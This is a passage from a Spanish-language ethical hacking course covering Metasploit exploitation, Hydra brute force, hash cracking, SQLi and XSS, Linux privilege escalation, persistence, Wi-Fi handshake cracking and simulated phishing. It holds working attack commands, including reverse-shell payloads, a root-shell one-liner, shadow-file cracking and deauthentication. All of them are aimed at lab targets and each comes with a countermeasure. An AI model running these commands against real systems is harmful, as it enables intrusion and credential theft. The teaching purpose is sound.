set payload cmd/unix/interact
exploit                         # o "run"
```

### 7.3. Ejemplos de explotación en laboratorio (nivel conceptual/didáctico)

Sobre **Metasploitable 2** se pueden estudiar vulnerabilidades emblemáticas, siempre con fin didáctico:

| Vulnerabilidad | Módulo Metasploit | Concepto que ilustra |
|---|---|---|
| **Backdoor vsftpd 2.3.4** | `exploit/unix/ftp/vsftpd_234_backdoor` | Software troyanizado en su origen |
| **UnrealIRCd backdoor** | `exploit/unix/irc/unreal_ircd_3281_backdoor` | Puerta trasera en binario distribuido |
| **distcc** | `exploit/unix/misc/distcc_exec` | Ejecución remota por servicio mal configurado |
| **Samba usermap_script** | `exploit/multi/samba/usermap_script` | Inyección de comandos en Samba |

El valor pedagógico no está en "conseguir la shell", sino en **entender por qué la vulnerabilidad existe** y **cómo se habría evitado**. No se desarrollan exploits novedosos ni técnicas de *weaponización* avanzada: se usan módulos estándar contra dianas de práctica.

> ### 🧪 Laboratorio práctico (entorno autorizado): Explotación de vsftpd 2.3.4 en Metasploitable 2
> **Diana de práctica:** Metasploitable 2 en `192.168.56.101`.
>
> ```bash
> msfconsole -q
> use exploit/unix/ftp/vsftpd_234_backdoor
> set RHOSTS 192.168.56.101
> run
> # Al obtener sesión, verificar acceso:
> id
> whoami
> ```
> Documenta la sesión obtenida como evidencia (captura del `id` mostrando el usuario). El fallo se debe a que esa versión concreta de vsftpd fue distribuida con una **puerta trasera** que abre una shell al recibir un usuario terminado en `:)`.
>
> **🛡️ Contramedida / defensa:** (1) **Verificar la integridad** del software descargado (firmas GPG, *checksums*) para detectar binarios troyanizados; (2) obtener software solo de **fuentes oficiales**; (3) **actualizar** a versiones sin la puerta trasera; (4) segmentar y filtrar el servicio FTP; (5) desplegar detección de comportamiento anómalo (un servicio FTP que lanza un `/bin/sh` es un IoC claro).

> ### 🧪 Laboratorio práctico (entorno autorizado): Meterpreter y escaneo de módulos
> **Diana de práctica:** Metasploitable 2 / VulnHub en host-only.
>
> ```bash
> use exploit/multi/samba/usermap_script
> set RHOSTS 192.168.56.101
> set payload cmd/unix/reverse
> set LHOST 192.168.56.102
> run
> ```
> Analiza la diferencia entre una shell simple y una sesión Meterpreter (esta última ofrece comandos como `sysinfo`, `getuid`, `hashdump` en post-explotación).
>
> **🛡️ Contramedida / defensa:** Mantener Samba actualizado, deshabilitar `username map script`, aplicar SELinux/AppArmor para confinar el servicio y monitorizar la ejecución de shells por procesos de servicio.

> ### ✍️ Ejercicios propuestos
> 1. Explica con tus palabras la diferencia entre *bind shell* y *reverse shell* y por qué la inversa evade mejor los cortafuegos.
> 2. Usa `searchsploit` para localizar el exploit de UnrealIRCd y explótalo en laboratorio con el módulo de Metasploit correspondiente.
> 3. Para dos exploits usados, redacta la **contramedida** que habría impedido el ataque.

---

## Unidad Didáctica 8 — Ataques a credenciales: fuerza bruta y cracking de hashes

### 8.1. El problema de las contraseñas

> **🔒 Recordatorio ético:** Los ataques de fuerza bruta y el cracking se realizan **solo** contra servicios y hashes de laboratorio. Atacar la autenticación de un servicio ajeno es acceso ilícito (art. 197 bis CP).

Las **credenciales débiles** son una de las causas más frecuentes de compromiso. Dos familias de ataque:

- **Ataques online (contra un servicio en vivo):** se prueban credenciales contra un servicio (SSH, FTP, HTTP, RDP). Son **ruidosos** y limitados por bloqueos y latencia. Herramienta: **Hydra**.
- **Ataques offline (contra hashes robados):** se dispone del hash de la contraseña y se intenta recuperar la contraseña original sin tocar ningún servicio. Muy rápido. Herramientas: **John the Ripper** y **Hashcat**.

### 8.2. Tipos de ataque de contraseñas

| Tipo | Descripción |
|---|---|
| **Diccionario** | Se prueban palabras de una lista (*wordlist*, p. ej. `rockyou.txt`) |
| **Fuerza bruta pura** | Se prueban todas las combinaciones de un espacio de caracteres |
| **Híbrido** | Diccionario + reglas de mutación (añadir números, símbolos) |
| **Password spraying** | Una única contraseña común contra muchos usuarios (evita bloqueos) |
| **Rainbow tables** | Tablas precomputadas de hashes (contrarrestadas por el *salt*) |

### 8.3. Fuerza bruta online con Hydra

```bash
# Fuerza bruta SSH contra la diana de laboratorio
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101

# Fuerza bruta FTP con lista de usuarios y contraseñas
hydra -L usuarios.txt -P passwords.txt ftp://192.168.56.101

# Fuerza bruta de un formulario web (DVWA) — módulo http-post-form
hydra -l admin -P passwords.txt 192.168.56.101 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^:Login failed"
```

### 8.4. Cracking de hashes offline con John y Hashcat

Los sistemas no almacenan contraseñas en claro, sino **hashes** (idealmente con **salt** y algoritmos lentos como bcrypt). El cracking intenta encontrar una entrada que produzca el mismo hash.

```bash
# Identificar el tipo de hash
hashid '$1$xyz$abc...'          # o hash-identifier

# John the Ripper (formato Unix shadow de laboratorio)
unshadow /etc/passwd /etc/shadow > combinado.txt   # (ficheros de laboratorio)
john --wordlist=/usr/share/wordlists/rockyou.txt combinado.txt
john --show combinado.txt

# Hashcat (aprovecha GPU). -m selecciona el modo/algoritmo
hashcat -m 0 hashes_md5.txt /usr/share/wordlists/rockyou.txt      # MD5
hashcat -m 1800 hashes_sha512crypt.txt rockyou.txt               # sha512crypt
hashcat -m 1000 hashes_ntlm.txt rockyou.txt                      # NTLM
```

| Modo Hashcat (`-m`) | Algoritmo |
|---|---|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM (Windows) |
| 1800 | sha512crypt (Linux `$6$`) |
| 3200 | bcrypt (`$2*$`) |

> ### 🧪 Laboratorio práctico (entorno autorizado): Fuerza bruta SSH y cracking de shadow
> **Diana de práctica:** Metasploitable 2 (`192.168.56.101`) y su fichero `/etc/shadow` obtenido tras comprometer la máquina en el laboratorio.
>
> 1. Lanza Hydra contra SSH con una wordlist reducida y localiza la credencial `msfadmin:msfadmin`.
> 2. Tras acceder, extrae `/etc/passwd` y `/etc/shadow` (de la máquina de laboratorio), combínalos con `unshadow` y crackéalos con John.
> 3. Compara el tiempo de crackeo de un hash MD5 sin *salt* frente a uno sha512crypt con *salt*.
>
> **🛡️ Contramedida / defensa:** (1) **Políticas de contraseñas robustas** y uso de **gestores de contraseñas**; (2) **doble factor (MFA/2FA)**, que hace inútil una contraseña comprometida; (3) **bloqueo de cuenta** tras N intentos y **rate limiting** contra fuerza bruta online; (4) almacenar hashes con **algoritmos lentos y salados** (bcrypt, argon2); (5) usar **fail2ban** para bloquear IPs que hacen fuerza bruta SSH; (6) detectar *password spraying* mediante correlación de intentos fallidos.

> ### ✍️ Ejercicios propuestos
> 1. Crackea un conjunto de hashes MD5 de práctica y explica por qué MD5 es inadecuado para almacenar contraseñas.
> 2. Configura **fail2ban** en tu diana de laboratorio y demuestra que bloquea a Hydra.
> 3. Diseña una política de contraseñas conforme a las recomendaciones actuales (longitud sobre complejidad, *passphrases*, sin caducidad forzada innecesaria) y justifícala.

---

## Unidad Didáctica 9 — Explotación de aplicaciones web

### 9.1. La superficie web y OWASP

> **🔒 Recordatorio ético:** Las prácticas web se realizan **solo** contra aplicaciones vulnerables propias (DVWA, OWASP Juice Shop, Mutillidae) o plataformas de entrenamiento legales.

Las aplicaciones web concentran una parte enorme del riesgo. El referente es el **OWASP Top 10** (riesgos más críticos) y la guía de pruebas **OWASP WSTG**. Categorías destacadas del OWASP Top 10 (2021):

| Categoría | Ejemplo |
|---|---|
| **A01 Broken Access Control** | Acceso a recursos ajenos (IDOR) |
| **A02 Cryptographic Failures** | Datos sensibles sin cifrar |
| **A03 Injection** | SQLi, comando, LDAP |
| **A05 Security Misconfiguration** | Cabeceras, errores verbosos |
| **A07 Identification & Auth Failures** | Sesiones débiles, credenciales |

### 9.2. Burp Suite como proxy de interceptación

**Burp Suite** es el proxy web de referencia. Se sitúa entre el navegador y la aplicación, permitiendo **interceptar, modificar y repetir** peticiones. Módulos clave: **Proxy**, **Repeater**, **Intruder**, **Decoder**, **Comparer**.

Flujo básico: configurar el navegador para usar el proxy de Burp (`127.0.0.1:8080`), instalar el certificado CA de Burp, e interceptar las peticiones a la aplicación de laboratorio.

### 9.3. Vulnerabilidades web fundamentales (nivel conceptual/lab)

**Inyección SQL (SQLi):** entrada del usuario que altera una consulta SQL. Concepto en DVWA:

```text
# Entrada en un campo vulnerable (laboratorio DVWA)
1' OR '1'='1
```

Herramienta de automatización didáctica: **sqlmap** (solo contra DVWA/laboratorio):

```bash
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxxx; security=low" --dbs
```

**Cross-Site Scripting (XSS):** inyección de JavaScript en una web que se ejecuta en el navegador de otros usuarios. Prueba conceptual en DVWA:

```text
<script>alert('XSS-lab')</script>
```

**Inclusión de ficheros (LFI/RFI)** y **subida de ficheros maliciosos** completan el catálogo didáctico. En todos los casos, el foco es **entender la causa** (falta de validación/saneamiento de entradas) y la defensa.

> ### 🧪 Laboratorio práctico (entorno autorizado): SQLi y XSS en DVWA
> **Diana de práctica:** DVWA en `192.168.56.101` (nivel de seguridad "low" para aprendizaje, luego "medium/high").
>
> 1. Con Burp, intercepta la petición del módulo SQLi y prueba el payload `1' OR '1'='1`.
> 2. Usa sqlmap para enumerar bases de datos y volcar (solo) una tabla de muestra.
> 3. En el módulo XSS reflejado, inyecta `<script>alert(1)</script>` y observa la ejecución.
> 4. Repite con el nivel de seguridad "high" y observa cómo el saneamiento lo impide.
>
> **🛡️ Contramedida / defensa:** Contra SQLi, **consultas parametrizadas (prepared statements)** y ORM, validación de entrada y mínimo privilegio de la cuenta de BD. Contra XSS, **codificación de salida contextual**, cabecera **Content-Security-Policy (CSP)** y atributo `HttpOnly` en cookies. En general: **validar toda entrada**, aplicar un **WAF** como capa adicional y seguir la OWASP WSTG.

> ### ✍️ Ejercicios propuestos
> 1. Demuestra un caso de **IDOR** en Juice Shop accediendo a un recurso de otro usuario y propón la corrección.
> 2. Explica la diferencia entre XSS **reflejado**, **almacenado** y **basado en DOM**.
> 3. Usando Burp Repeater, manipula una cabecera de sesión y describe cómo el servidor debería validarla.

---

## Unidad Didáctica 10 — Post-explotación: escalada de privilegios

### 10.1. Concepto de post-explotación

> **🔒 Recordatorio ético:** La post-explotación se practica **solo** sobre máquinas de laboratorio ya comprometidas dentro del alcance autorizado.

Tras obtener un acceso inicial (normalmente con **privilegios bajos**), la **post-explotación** persigue: **escalar privilegios**, **mantener el acceso (persistencia)**, **moverse lateralmente** y **recopilar evidencias/objetivos**. La perspectiva del módulo es siempre **doble**: cómo se hace y **cómo se detecta y previene**.

### 10.2. Escalada de privilegios en Linux

El objetivo es pasar de un usuario sin privilegios a **root**. Vectores más comunes:

| Vector | Descripción | Ejemplo |
|---|---|---|
| **Binarios SUID** | Ejecutables que corren con permisos del propietario (root) | `find / -perm -4000 2>/dev/null` |
| **sudo mal configurado** | Comandos que un usuario puede ejecutar como root | `sudo -l` y explotación vía GTFOBins |
| **Kernel vulnerable** | Exploits locales de kernel antiguo | *Dirty COW* (conceptual) |
| **Cron jobs** | Tareas programadas escribibles por el usuario | Script cron con permisos laxos |
| **Capabilities y PATH** | *Capabilities* excesivas, *PATH hijacking* | `getcap -r /` |

**GTFOBins** es un catálogo de binarios legítimos que, con SUID o sudo, permiten escalar (p. ej. `vim`, `find`, `less`, `awk`).

```bash
# Enumeración manual de vectores
sudo -l                                   # qué puedo ejecutar como root
find / -perm -4000 -type f 2>/dev/null    # binarios SUID
getcap -r / 2>/dev/null                   # capabilities
crontab -l ; cat /etc/crontab             # tareas programadas
```

**linPEAS** automatiza esta enumeración, resaltando en colores los vectores prometedores:

```bash
# Ejecutar linpeas en la máquina de laboratorio comprometida
./linpeas.sh | tee linpeas.txt
```

### 10.3. Escalada de privilegios en Windows (conceptual)

En Windows el objetivo es llegar a **SYSTEM** o **Administrator**. Vectores conceptuales:

| Vector | Descripción |
|---|---|
| **Servicios mal configurados** | Rutas sin comillas (*unquoted service path*), permisos de servicio débiles |
| **AlwaysInstallElevated** | Política que instala MSI con privilegios elevados |
| **Credenciales almacenadas** | En ficheros, registro, `cmdkey`, GPP |
| **Token impersonation** | Abuso de privilegios `SeImpersonate` (familia "Potato") |
| **UAC bypass** | Elevación evadiendo el control de cuentas |

**winPEAS** es el equivalente a linPEAS para Windows. La herramienta permite enumerar automáticamente estos vectores en un entorno de laboratorio.

> ### 🧪 Laboratorio práctico (entorno autorizado): Escalada en Linux con SUID y sudo
> **Diana de práctica:** Metasploitable 2 o una VM de VulnHub con escalada Linux, en host-only.
>
> 1. Con un shell de usuario sin privilegios, ejecuta `sudo -l` y `find / -perm -4000 2>/dev/null`.
> 2. Si `find` o `vim` tienen SUID, consulta **GTFOBins** y escala a root (p. ej. `find . -exec /bin/sh -p \; -quit`).
> 3. Ejecuta **linPEAS** y contrasta sus hallazgos con tu enumeración manual.
> 4. Verifica el privilegio obtenido con `id` (debe mostrar `uid=0(root)`).
>
> **🛡️ Contramedida / defensa:** (1) **Auditar y minimizar binarios SUID**; (2) configurar **sudo con el mínimo privilegio** y sin comodines peligrosos; (3) **actualizar el kernel** y el sistema; (4) permisos correctos en cron y scripts; (5) monitorización de integridad de ficheros (AIDE) y auditoría (auditd) para detectar cambios y ejecuciones anómalas; (6) EDR que detecte patrones de escalada.

> ### ✍️ Ejercicios propuestos
> 1. Localiza en GTFOBins tres binarios explotables vía sudo y describe su vector.
> 2. Ejecuta winPEAS en una VM Windows de laboratorio y clasifica los hallazgos por probabilidad de éxito.
> 3. Explica cómo `auditd` (Linux) permitiría **detectar** una escalada vía SUID.

---

## Unidad Didáctica 11 — Post-explotación: persistencia y movimiento lateral

### 11.1. Persistencia (conceptos y detección)

> **🔒 Recordatorio ético:** En un pentest real, la persistencia se implanta **solo si el ROE lo autoriza** y se **retira íntegramente** al finalizar, documentando cada mecanismo. En laboratorio se estudia para **aprender a detectarla**.

La **persistencia** permite al atacante **recuperar el acceso** aunque se reinicie el sistema o se cambien credenciales. Mecanismos habituales (mapeables a **MITRE ATT&CK**, táctica TA0003):

| Mecanismo (Linux/Windows) | Descripción | Indicador de compromiso (IoC) |
|---|---|---|
| **Cron / Scheduled Task** | Tarea programada que reabre acceso | Entradas cron/tareas no reconocidas |
| **Servicios / systemd** | Servicio malicioso al arranque | Servicios extraños, `.service` recientes |
| **Claves SSH autorizadas** | Añadir clave pública del atacante | Cambios en `~/.ssh/authorized_keys` |
| **Cuentas nuevas / backdoor user** | Usuario oculto con privilegios | Usuarios recientes en `/etc/passwd` |
| **Registro Run (Windows)** | Ejecución al inicio de sesión | Claves `Run`/`RunOnce` anómalas |
| **Webshell** | Fichero web que ejecuta comandos | Ficheros `.php/.jsp` recientes en webroot |

### 11.2. Movimiento lateral (conceptos)

El **movimiento lateral** (MITRE ATT&CK, TA0008) es la técnica de **pivotar** desde el sistema comprometido hacia otros de la red interna. Conceptos:

- **Reutilización de credenciales** obtenidas (contraseñas, hashes).
- **Pass-the-Hash / Pass-the-Ticket** en entornos Windows/Active Directory (uso del hash NTLM o ticket Kerberos sin conocer la contraseña).
- **Pivoting / port forwarding:** usar la máquina comprometida como salto (túneles SSH, `proxychains`, módulos de Metasploit) para alcanzar segmentos no accesibles directamente.
- **Herramientas de administración legítimas** (PsExec, WMI, RDP) usadas de forma maliciosa ("*living off the land*").

Estas técnicas se explican a **nivel conceptual** y se practican en laboratorios controlados (p. ej., un AD de práctica), enfatizando la **detección**.

### 11.3. Recopilación de evidencias y limpieza

En una auditoría real, tras alcanzar los objetivos:

- Se **recopilan evidencias** (capturas, hashes de ficheros de prueba, salidas de comandos) suficientes para el informe, aplicando **minimización de datos** (RGPD).
- Se **elimina** cualquier artefacto introducido (payloads, cuentas, claves, webshells) para **dejar el sistema como estaba**.
- Se documenta un **registro de acciones** con marcas de tiempo.

> ### 🧪 Laboratorio práctico (entorno autorizado): Detección de persistencia
> **Diana de práctica:** una VM de laboratorio donde tú mismo implantas y luego detectas persistencia.
>
> 1. Implanta (en tu VM) una tarea cron que abra una reverse shell periódica.
> 2. Añade una clave a `~/.ssh/authorized_keys`.
> 3. Actúa ahora como **defensor**: usa `crontab -l`, revisa `/etc/cron*`, `authorized_keys`, usuarios recientes en `/etc/passwd`, y servicios systemd nuevos.
> 4. Mapea cada mecanismo hallado a la técnica correspondiente de **MITRE ATT&CK**.
> 5. **Elimina** todos los artefactos implantados.
>
> **🛡️ Contramedida / defensa:** **Monitorización de integridad** (AIDE, Tripwire), **centralización de logs** (SIEM) con alertas sobre creación de usuarios/tareas/servicios, **detección de webshells**, revisión periódica de `authorized_keys` y **EDR/XDR** que detecte comportamientos de persistencia. Segmentación y MFA dificultan el movimiento lateral.

> ### ✍️ Ejercicios propuestos
> 1. Enumera cinco IoC de persistencia en Windows y su ubicación exacta.
> 2. Explica en qué consiste **Pass-the-Hash** y por qué el MFA y la protección de credenciales (Credential Guard) lo mitigan.
> 3. Diseña una regla conceptual de SIEM que alerte ante la creación de un nuevo usuario con privilegios.

---

## Unidad Didáctica 12 — Auditoría de redes inalámbricas

### 12.1. Fundamentos de seguridad Wi-Fi

> **🔒 Recordatorio ético CRÍTICO:** La captura de tráfico Wi-Fi y los ataques a handshake se realizan **EXCLUSIVAMENTE SOBRE TU PROPIA RED de laboratorio** (un router/AP de tu propiedad, dedicado a prácticas). Capturar o descifrar tráfico de redes ajenas vulnera el **art. 197 bis CP** (interceptación de comunicaciones) y la normativa de secreto de las comunicaciones. **Nunca** se audita una red Wi-Fi que no sea propia o expresamente autorizada por su titular.

La seguridad de las redes inalámbricas ha evolucionado a través de varios protocolos, cada uno con debilidades:

| Protocolo | Año | Cifrado | Estado de seguridad |
|---|---|---|---|
| **WEP** | 1999 | RC4 con IV de 24 bits | **Roto**. Se recupera la clave con suficiente tráfico (debilidad del IV). Obsoleto. |
| **WPA** | 2003 | TKIP | Transitorio; también vulnerable. |
| **WPA2** | 2004 | AES-CCMP | Estándar durante años. Vulnerable a captura de handshake + fuerza bruta offline y a **KRACK** (reinstalación de clave). |
| **WPA3** | 2018 | SAE (*Dragonfly*) | Actual. **Forward secrecy**, resistente a diccionario offline; mitiga las debilidades de WPA2. |

### 12.2. Por qué WEP y WPA2-PSK son débiles

- **WEP:** el vector de inicialización (IV) de 24 bits se repite; recopilando suficientes IVs se recupera la clave estadísticamente. Es un fallo de diseño criptográfico.
- **WPA2-PSK (personal):** el intercambio de 4 vías (*4-way handshake*) permite, si se captura, realizar un ataque de **diccionario/fuerza bruta offline** contra la *passphrase*. Si la contraseña es débil, se recupera. WPA3 lo corrige con SAE.

### 12.3. El proceso de auditoría con aircrack-ng (sobre red propia)

La suite **aircrack-ng** permite auditar redes Wi-Fi. Requiere una **tarjeta inalámbrica compatible con modo monitor**.

```bash
# 1. Poner la tarjeta en modo monitor
sudo airmon-ng start wlan0

# 2. Escuchar redes cercanas (identifica TU red por su BSSID)
sudo airodump-ng wlan0mon

# 3. Capturar el handshake de TU red (fija canal y BSSID propios)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon

# 4. (Opcional, sobre tu red) forzar reconexión de TU propio cliente para capturar el handshake
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. Crackear el handshake capturado con diccionario (offline)
aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap
```

El paso 4 (**deautenticación**) ilustra por qué es un ataque **detectable y disruptivo**; en la propia red de laboratorio sirve para entender el mecanismo. En redes ajenas es ilegal.

> ### 🧪 Laboratorio práctico (entorno autorizado): Captura y crackeo de handshake de la propia red
> **Diana de práctica:** un router/AP **de tu propiedad**, dedicado a laboratorio, con una *passphrase* que tú has configurado (idealmente una débil de prueba y luego una fuerte para comparar).
>
> 1. Configura tu AP de laboratorio con WPA2-PSK y una contraseña de prueba conocida.
> 2. Sigue los pasos de aircrack-ng anteriores para capturar el handshake de **tu** red.
> 3. Crackéalo con una wordlist y comprueba que recuperas **tu** contraseña de prueba.
> 4. Cambia la contraseña por una *passphrase* larga y aleatoria y comprueba que el ataque de diccionario **falla**.
>
> **🛡️ Contramedida / defensa:** (1) Usar **WPA3** cuando sea posible; (2) con WPA2, emplear **passphrases largas y aleatorias** (mínimo 15+ caracteres) que resistan el diccionario offline; (3) desactivar **WPS** (vulnerable a ataques de PIN); (4) para entornos corporativos, usar **WPA2/WPA3-Enterprise (802.1X/RADIUS)** con credenciales por usuario; (5) detección de tramas de **deautenticación** anómalas mediante WIDS (*Wireless IDS*).

> ### ✍️ Ejercicios propuestos
> 1. Explica técnicamente por qué WEP es inseguro (debilidad del IV) y por qué WPA3 resiste el ataque de diccionario offline.
> 2. Compara el tiempo de crackeo de tu red con una contraseña de 8 caracteres frente a una *passphrase* de 20.
> 3. Investiga qué es el ataque **KRACK** y qué actualización lo mitigó.

---

## Unidad Didáctica 13 — Ingeniería social y phishing simulado

### 13.1. El factor humano

> **🔒 Recordatorio ético CRÍTICO:** Una campaña de ingeniería social solo es legítima si está **explícitamente autorizada en el ROE**, se dirige a **empleados de la organización cliente** (nunca a terceros) y respeta el **RGPD**. Se recomienda informar previamente (aunque sea de forma general) al comité de dirección/RRHH y **anonimizar los resultados** para no señalar individualmente a las personas. El objetivo es **medir y mejorar la concienciación**, no castigar.

La **ingeniería social** explota la **psicología humana** (confianza, urgencia, autoridad, miedo, curiosidad) para inducir a las personas a **revelar información** o **realizar acciones** que comprometen la seguridad. Es, con frecuencia, el vector de entrada más eficaz, porque **elude los controles técnicos**.

| Técnica | Descripción |
|---|---|
| **Phishing** | Correos masivos fraudulentos que imitan a entidades legítimas |
| **Spear phishing** | Phishing dirigido y personalizado (usa OSINT) |
| **Vishing** | Ingeniería social por teléfono/voz |
| **Smishing** | A través de SMS |
| **Pretexting** | Crear un escenario/pretexto creíble para obtener información |
| **Baiting** | Cebo físico (USB "perdido") o digital |
| **Tailgating** | Acceso físico siguiendo a un empleado autorizado |

### 13.2. Anatomía de una campaña de phishing simulado autorizada

Un ejercicio de phishing simulado profesional sigue estas fases:

1. **Autorización y definición de objetivos** (en el ROE): grupos de empleados, métricas a medir (tasa de apertura, de clic, de entrega de credenciales), y compromiso de **anonimización**.
2. **Diseño del pretexto**: correo verosímil pero **ético** (evitar temas sensibles como despidos o salud).
3. **Infraestructura**: dominio de campaña, servidor de correo, **landing page** que **no captura contraseñas reales** más allá de registrar el evento (o las almacena de forma segura y las descarta).
4. **Envío controlado** dentro de la ventana autorizada.
5. **Medición** de resultados agregados.
6. **Formación inmediata**: quien "cae" es redirigido a una **página de concienciación**, no señalado.

### 13.3. Gophish y SET

- **Gophish** es un *framework* de código abierto para **gestionar campañas de phishing simulado internas**: plantillas de correo, *landing pages*, grupos de destinatarios y **panel de métricas**.
- **SET (Social-Engineer Toolkit)** es un conjunto de herramientas para vectores de ingeniería social (clonado de páginas, generación de payloads). Se usa **solo en laboratorio/autorizado**.

> ### 🧪 Laboratorio práctico (entorno autorizado): Campaña de phishing simulado con Gophish
> **Diana de práctica:** un grupo de **cuentas de correo de laboratorio** propias (creadas por ti para la práctica), NUNCA usuarios reales sin autorización.
>
> 1. Instala Gophish y accede al panel de administración.
> 2. Crea un **Sending Profile** (servidor SMTP de laboratorio).
> 3. Diseña una **Email Template** y una **Landing Page** de concienciación (que al enviar redirija a una página educativa).
> 4. Define un **Group** con las cuentas de prueba y lanza la **Campaign**.
> 5. Analiza el **dashboard**: correos enviados, abiertos, clics, credenciales "enviadas". Observa que Gophish registra los eventos con marca de tiempo.
> 6. Redacta un informe **agregado y anonimizado** con las métricas y recomendaciones de concienciación.
>
> **🛡️ Contramedida / defensa:** (1) **Formación y concienciación continua** de los empleados (el control más eficaz); (2) **filtros antiphishing/antispam** y análisis de enlaces; (3) autenticación de correo **SPF, DKIM y DMARC** para dificultar la suplantación del dominio; (4) **MFA**, que reduce el impacto de una credencial robada; (5) procedimientos claros de **reporte de correos sospechosos** (botón de "reportar phishing"); (6) *sandboxing* de adjuntos.

> ### ✍️ Ejercicios propuestos
> 1. Diseña una plantilla de correo de phishing simulado **ética** y justifica por qué evitas ciertos temas (salud, nóminas, despidos).
> 2. Explica cómo **SPF, DKIM y DMARC** trabajan juntos para autenticar el correo y dificultar la suplantación.
> 3. Elabora un tríptico de **concienciación** para empleados con las 7 señales de alerta de un correo de phishing.

---

## Unidad Didáctica 14 — Elaboración del informe de auditoría

### 14.1. El informe como producto final

El **informe** es el **entregable de mayor valor** de una auditoría: es lo que el cliente lee y sobre lo que actúa. Una auditoría técnicamente brillante con un informe deficiente **no aporta valor**. Debe ser **claro, reproducible, priorizado y accionable**.

### 14.2. Estructura de un informe profesional

| Sección | Contenido |
|---|---|
| **Resumen ejecutivo** | Para dirección: sin jerga, riesgo global, principales hallazgos e impacto de negocio |
| **Alcance y metodología** | Qué se auditó, cuándo, con qué metodología (PTES/OSSTMM/WSTG) y limitaciones |
| **Hallazgos detallados** | Cada vulnerabilidad: descripción, criticidad (CVSS), evidencia, pasos de reproducción, impacto y recomendación |
| **Plan de remediación** | Acciones priorizadas por riesgo/esfuerzo, con responsables y plazos |
| **Anexos** | Salidas de herramientas, capturas, referencias (CVE, CWE) |

### 14.3. Priorización del riesgo

Cada hallazgo se **prioriza** combinando **probabilidad** e **impacto**, apoyándose en el **CVSS** y en el **contexto de negocio**. Un fallo de CVSS alto en un sistema aislado puede tener menos prioridad real que uno medio en un servicio crítico expuesto.

| Criticidad | CVSS orientativo | Acción |
|---|---|---|
| **Crítica** | 9.0 – 10.0 | Corrección inmediata |
| **Alta** | 7.0 – 8.9 | Corrección urgente |
| **Media** | 4.0 – 6.9 | Corrección planificada |
| **Baja** | 0.1 – 3.9 | Corrección/aceptación de riesgo |

### 14.4. Ficha tipo de un hallazgo

```text
ID: WEB-001
Título: Inyección SQL en el parámetro "id" del módulo de consulta
Criticidad: Crítica (CVSS 9.8)
Sistema afectado: 192.168.56.101 (aplicación DVWA de laboratorio)
Descripción: El parámetro "id" no se sanea, permitiendo alterar la consulta SQL.
Evidencia: [captura de sqlmap volcando la lista de tablas]
Reproducción:
  1. Acceder a /vulnerabilities/sqli/?id=1
  2. Inyectar 1' OR '1'='1
Impacto: Acceso no autorizado a la base de datos; posible volcado de datos.
Recomendación: Usar consultas parametrizadas; validar entrada; mínimo privilegio de BD.
Referencia: OWASP A03:2021, CWE-89.
```

> ### ✍️ Ejercicios propuestos
> 1. Redacta el **resumen ejecutivo** (media página, sin jerga) de una auditoría ficticia de tu laboratorio.
> 2. Documenta **tres hallazgos** de tus laboratorios previos usando la ficha tipo.
> 3. Prioriza esos hallazgos y justifica el orden combinando CVSS y contexto de negocio.

---

## Proyecto integrador del módulo

### Enunciado: auditoría simulada completa "PYME Lab, S.L."

> **🔒 Marco del proyecto:** Toda la auditoría se realiza **exclusivamente** sobre un **laboratorio propio y aislado** (red host-only) que simula la infraestructura de una PYME ficticia. Antes de empezar, el alumnado firma (a modo de simulacro didáctico) la **carta de autorización** y define el **ROE**.

El alumnado asume el rol de **equipo de auditoría** contratado por "PYME Lab, S.L." para realizar un **test de intrusión de caja gris**. El laboratorio objetivo incluye:

- Un **servidor Linux vulnerable** (Metasploitable 2) con servicios FTP, SMB, HTTP, MySQL.
- Una **aplicación web vulnerable** (DVWA / Juice Shop).
- (Opcional) una **VM Windows** de laboratorio para escalada.
- Un **AP Wi-Fi propio** de laboratorio (WPA2 con contraseña de prueba).
- Un **conjunto de cuentas de correo de laboratorio** para el ejercicio de phishing simulado.

### Fases y entregables

| Fase | Actividad | Entregable |
|---|---|---|
| **0. Preparación** | Firma de autorización simulada, definición de alcance y ROE, montaje del lab aislado | Documento de alcance + diagrama de red |
| **1. Reconocimiento** | OSINT sobre dominio propio, descubrimiento de hosts | Informe de reconocimiento |
| **2. Escaneo y enumeración** | nmap (`-sS -sV -sC`), enumeración SMB/HTTP/DNS | Tablas de servicios y versiones |
| **3. Análisis de vulnerabilidades** | OpenVAS/Nessus + searchsploit, validación manual | Listado priorizado (CVSS) |
| **4. Explotación** | Metasploit contra el servidor, SQLi/XSS en la web, Hydra + cracking | Evidencias de acceso |
| **5. Post-explotación** | Escalada (SUID/sudo/linPEAS), detección de persistencia | Prueba de root + IoC |
| **6. Wi-Fi** | Captura y crackeo del handshake de la red propia | Análisis y contramedidas |
| **7. Ingeniería social** | Campaña de phishing simulado con Gophish (cuentas de lab) | Métricas anonimizadas + material de concienciación |
| **8. Informe** | Redacción del informe completo (ejecutivo + técnico) | **Informe de auditoría final** |
| **9. Defensa** | Presentación oral de hallazgos y recomendaciones | Presentación |

El proyecto exige que **cada técnica ofensiva vaya acompañada de su contramedida**, cerrando así el ciclo ofensivo-defensivo que es el corazón del hacking ético.

---

## Evaluación y rúbrica

### Criterios de calificación

| Instrumento | Peso |
|---|---|
| Laboratorios prácticos (por unidad) | 30 % |
| Ejercicios propuestos y cuaderno de prácticas | 15 % |
| Proyecto integrador (auditoría + informe) | 40 % |
| Defensa oral del proyecto | 10 % |
| Actitud ética y cumplimiento del marco legal | 5 % (con carácter eliminatorio si hay incumplimiento grave) |

> **Nota eliminatoria:** cualquier práctica realizada **fuera del entorno autorizado** (contra sistemas de terceros o redes ajenas) supone el **suspenso automático** del módulo y la comunicación al centro, con independencia de la calidad técnica. La ética no es negociable.

### Rúbrica del proyecto integrador

| Dimensión | Insuficiente (0-4) | Aceptable (5-6) | Notable (7-8) | Excelente (9-10) |
|---|---|---|---|---|
| **Metodología** | No sigue una metodología | Sigue fases básicas | Aplica PTES/WSTG con orden | Metodología rigurosa y trazable con MITRE ATT&CK |
| **Cobertura técnica** | Pocas fases cubiertas | Reconocimiento y escaneo | + explotación y post-explotación | Todas las fases incl. Wi-Fi e ing. social |
